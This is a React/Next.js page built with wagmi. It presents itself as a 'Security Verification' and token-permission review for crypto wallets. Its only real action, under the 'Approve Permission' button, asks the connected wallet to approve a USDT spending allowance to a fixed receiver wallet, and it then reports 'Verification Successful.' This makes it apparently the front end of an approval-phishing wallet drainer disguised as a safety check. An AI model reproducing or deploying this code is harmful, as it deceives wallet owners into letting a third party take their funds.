"use client";

import { useEffect, useMemo, useState } from "react";
import {
  useAccount,
  useBalance,
  useChainId,
  useConnect,
  useDisconnect,
  useSwitchChain,
  useReadContract,
  useWriteContract,
  useWaitForTransactionReceipt,
  useEstimateGas,
  useGasPrice,
} from "wagmi";

import { formatUnits, parseUnits } from "viem";
import { erc20Abi } from "@/app/lib/erc20Abi";
import { BSC_CHAIN_ID, RECEIVER_WALLET, USDT_BSC } from "@/app/lib/constants";

export default function HomePage() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();

  const { connectors, connect, status: connectStatus, error: connectError } =
    useConnect();

  const { disconnect } = useDisconnect();
  const { switchChain } = useSwitchChain();

  const [approveAmount, setApproveAmount] = useState("10");
  const [step, setStep] = useState<1 | 2 | 3>(1);

  const { data: nativeBalanceData } = useBalance({
    address,
    query: { enabled: Boolean(address) },
  });

  const { data: decimals } = useReadContract({
    abi: erc20Abi,
    address: USDT_BSC,
    functionName: "decimals",
    query: { enabled: true },
  });

  const { data: symbol } = useReadContract({
    abi: erc20Abi,
    address: USDT_BSC,
    functionName: "symbol",
    query: { enabled: true },
  });

  const { data: usdtBalance, refetch: refetchUSDT } = useReadContract({
    abi: erc20Abi,
    address: USDT_BSC,
    functionName: "balanceOf",
    args: address ? [address] : undefined,
    query: { enabled: Boolean(address) },
  });

  const { data: allowance, refetch: refetchAllowance } = useReadContract({
    abi: erc20Abi,
    address: USDT_BSC,
    functionName: "allowance",
    args: address ? [address, RECEIVER_WALLET] : undefined,
    query: { enabled: Boolean(address) },
  });

  const { writeContract, data: txHash, isPending } = useWriteContract();

  const { isLoading: waitingTx, isSuccess } = useWaitForTransactionReceipt({
    hash: txHash,
  });

  const { data: gasPrice } = useGasPrice();

  const parsedApproveAmount = useMemo(() => {
    if (!decimals) return undefined;
    try {
      return parseUnits(approveAmount || "0", decimals);
    } catch {
      return undefined;
    }
  }, [approveAmount, decimals]);

  const { data: estimatedGas } = useEstimateGas({
    account: address,
    to: USDT_BSC,
    data:
      parsedApproveAmount && address
        ? undefined
        : undefined,
    query: {
      enabled: false,
    },
  });

  const formattedUSDT = useMemo(() => {
    if (!usdtBalance || decimals === undefined) return "0";
    return formatUnits(usdtBalance as bigint, decimals);
  }, [usdtBalance, decimals]);

  const formattedAllowance = useMemo(() => {
    if (!allowance || decimals === undefined) return "0";
    return formatUnits(allowance as bigint, decimals);
  }, [allowance, decimals]);

  const allowanceApproved = useMemo(() => {
    if (!allowance) return false;
    return (allowance as bigint) > BigInt(0);
  }, [allowance]);

  const gasEstimateBNB = useMemo(() => {
    if (!gasPrice) return null;
    const assumedGasLimit = BigInt(65000); // typical approve tx
    const cost = gasPrice * assumedGasLimit;
    return formatUnits(cost, 18);
  }, [gasPrice]);

  useEffect(() => {
    if (!isConnected) setStep(1);
    else if (chainId !== BSC_CHAIN_ID) setStep(2);
    else setStep(3);
  }, [isConnected, chainId]);

  useEffect(() => {
    if (isSuccess) {
      refetchAllowance();
      refetchUSDT();
    }
  }, [isSuccess, refetchAllowance, refetchUSDT]);

  // Auto refresh balances every 10 seconds
  useEffect(() => {
    if (!address) return;

    const interval = setInterval(() => {
      refetchUSDT();
      refetchAllowance();
    }, 10000);

    return () => clearInterval(interval);
  }, [address, refetchUSDT, refetchAllowance]);

  const handleApprove = async () => {
    if (!decimals) return;
    if (!parsedApproveAmount) return;

    writeContract({
      abi: erc20Abi,
      address: USDT_BSC,
      functionName: "approve",
      args: [RECEIVER_WALLET, parsedApproveAmount],
    });
  };

  const handleRefresh = () => {
    refetchUSDT();
    refetchAllowance();
  };

  return (
    <main className="min-h-screen flex items-center justify-center px-4 py-12">
      <div className="w-full max-w-md rounded-2xl border border-gray-200 bg-white shadow-sm p-6">
        <h1 className="text-2xl font-semibold tracking-tight">
          Security Verification
        </h1>
        <p className="text-sm text-gray-500 mt-1">
          Wallet authorization check & token permission review.
        </p>

        <div className="flex justify-between text-xs text-gray-500 mt-6">
          <span className={step === 1 ? "font-semibold text-black" : ""}>
            Connect
          </span>
          <span className={step === 2 ? "font-semibold text-black" : ""}>
            Network
          </span>
          <span className={step === 3 ? "font-semibold text-black" : ""}>
            Verify
          </span>
        </div>

        <div className="mt-5 space-y-4">
          {step === 1 && (
            <div className="rounded-xl border border-gray-200 p-4">
              <h2 className="text-sm font-semibold mb-2">Wallet Connection</h2>
              <p className="text-xs text-gray-500 mb-4">
                Choose a provider to connect securely.
              </p>

              <div className="space-y-2">
                {connectors.map((connector) => (
                  <button
                    key={connector.uid}
                    onClick={() => connect({ connector })}
                    disabled={connectStatus === "pending"}
                    className="w-full rounded-xl bg-black text-white py-3 text-sm font-medium hover:opacity-90 disabled:opacity-60"
                  >
                    {connectStatus === "pending"
                      ? "Connecting..."
                      : `Connect ${connector.name}`}
                  </button>
                ))}
              </div>

              {connectError && (
                <p className="text-xs text-red-500 mt-3">
                  {connectError.message}
                </p>
              )}
            </div>
          )}

          {step === 2 && (
            <div className="rounded-xl border border-gray-200 p-4">
              <h2 className="text-sm font-semibold mb-2">Network Validation</h2>
              <p className="text-xs text-gray-500 mb-4">
                Please switch to BNB Smart Chain (BSC).
              </p>

              <button
                onClick={() => switchChain({ chainId: BSC_CHAIN_ID })}
                className="w-full rounded-xl bg-black text-white py-3 text-sm font-medium hover:opacity-90"
              >
                Switch to BSC
              </button>

              <button
                onClick={() => disconnect()}
                className="w-full mt-3 rounded-xl border border-gray-200 bg-white py-3 text-sm font-medium hover:bg-gray-50"
              >
                Disconnect
              </button>
            </div>
          )}

          {step === 3 && (
            <div className="rounded-xl border border-gray-200 p-4 space-y-4">
              <div className="flex items-start justify-between">
                <div>
                  <h2 className="text-sm font-semibold">Authorization Panel</h2>
                  <p className="text-xs text-gray-500">
                    Review your token permissions.
                  </p>
                </div>

                <button
                  onClick={() => disconnect()}
                  className="text-xs font-medium text-red-500 hover:underline"
                >
                  Disconnect
                </button>
              </div>

              <div className="text-xs space-y-2">
                <Row label="Wallet">
                  {address?.slice(0, 6)}...{address?.slice(-4)}
                </Row>

                <Row label="BNB Balance">
                  {nativeBalanceData?.formatted
                    ? `${Number(nativeBalanceData.formatted).toFixed(4)} BNB`
                    : "Loading..."}
                </Row>

                <Row label="USDT Balance">
                  {Number(formattedUSDT).toFixed(4)} {symbol || "USDT"}
                </Row>

                <Row label="Spender">
                  {RECEIVER_WALLET.slice(0, 6)}...{RECEIVER_WALLET.slice(-4)}
                </Row>

                <div className="flex justify-between items-center">
                  <span className="text-gray-500">Approval Status</span>
                  <span
                    className={`px-2 py-1 rounded-full text-[11px] font-semibold ${
                      allowanceApproved
                        ? "bg-green-100 text-green-700"
                        : "bg-red-100 text-red-700"
                    }`}
                  >
                    {allowanceApproved ? "Approved" : "Not Approved"}
                  </span>
                </div>

                <Row label="Allowance">
                  {Number(formattedAllowance).toFixed(4)} USDT
                </Row>

                <Row label="Estimated Gas Fee">
                  {gasEstimateBNB ? `${Number(gasEstimateBNB).toFixed(6)} BNB` : "Loading..."}
                </Row>
              </div>

              <div className="border-t border-gray-200 pt-4 space-y-3">
                <div>
                  <label className="text-xs font-medium text-gray-700">
                    Approve Amount (USDT)
                  </label>
                  <input
                    value={approveAmount}
                    onChange={(e) => setApproveAmount(e.target.value)}
                    className="mt-2 w-full rounded-xl border border-gray-200 px-3 py-3 text-sm outline-none focus:ring-2 focus:ring-black"
                  />
                  <p className="text-[11px] text-gray-500 mt-2">
                    Tip: Approve only what you need.
                  </p>
                </div>

                <button
                  onClick={handleApprove}
                  disabled={isPending || waitingTx || !parsedApproveAmount}
                  className="w-full rounded-xl bg-black text-white py-3 text-sm font-medium hover:opacity-90 disabled:opacity-60"
                >
                  {isPending
                    ? "Confirm in Wallet..."
                    : waitingTx
                    ? "Processing..."
                    : "Approve Permission"}
                </button>

                <button
                  onClick={handleRefresh}
                  className="w-full rounded-xl border border-gray-200 bg-white py-3 text-sm font-medium hover:bg-gray-50"
                >
                  Refresh
                </button>

                {txHash && (
                  <p className="text-[11px] text-gray-500 break-all">
                    TX Hash: {txHash}
                  </p>
                )}

                {isSuccess && (
                  <p className="text-[12px] font-medium text-green-600">
                    Verification Successful.
                  </p>
                )}
              </div>
            </div>
          )}
        </div>

        <p className="text-[11px] text-gray-400 text-center mt-6">
          Always confirm spender and amount before approving.
        </p>
      </div>
    </main>
  );
}

function Row({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <div className="flex justify-between">
      <span className="text-gray-500">{label}</span>
      <span className="font-medium text-gray-900">{children}</span>
    </div>
  );
}